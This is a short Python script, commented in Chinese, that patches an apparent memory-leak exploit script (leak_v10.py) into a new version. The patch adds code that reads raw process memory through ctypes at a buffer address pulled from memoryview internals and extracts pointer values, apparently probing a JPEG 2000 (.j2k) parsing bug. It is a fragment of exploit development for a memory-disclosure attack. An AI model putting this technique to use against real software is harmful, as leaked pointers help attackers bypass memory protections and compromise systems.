#!/usr/bin/env python3
# 给 leak_v10.py 打最后一块补丁：命中后不用 memoryview 语义，直接用 ctypes.string_at 读 view.buf
import ast, sys

s = open('/tmp/leak_v10.py').read()
s = s.replace('/tmp/leak_result10.txt', '/tmp/leak_result11.txt')
s = s.replace('/tmp/LEAK10.j2k', '/tmp/LEAK11.j2k')

# 找到 dump() 里读取 64 字节那段，改为 ctypes 直读（绕开 0-dim memoryview 的索引限制）
old = """        try:
            d = h[:64].tobytes()"""

new = """        try:
            _buf = R(a + 0x28)
            _len = R(a + 0x38)
            out.append('   view.buf=%#x view.obj=%#x view.len=%#x' % (_buf, R(a + 0x30), _len))
            if 0x1000 < _buf < 0x800000000000 and _len > 64:
                d2 = ctypes.string_at(_buf, 64)
                out.append('   ★直读 @%#x = %s' % (_buf, d2.hex()))
                pts2 = [struct.unpack_from('<Q', d2, k)[0] for k in range(0, 64, 8)]
                out.append('   ★★ 指针=' + ','.join(hex(x) for x in pts2 if x > 0x10000))
        except BaseException as e2:
            out.append('   ctypes 直读失败 %r' % (e2,))
        try:
            d = h[:64].tobytes()"""

if old not in s:
    print('!! 锚点没找到'); sys.exit(1)
s = s.replace(old, new, 1)
open('/tmp/leak_v11.py', 'w').write(s)
ast.parse(s)
print('ok: /tmp/leak_v11.py 生成且语法通过')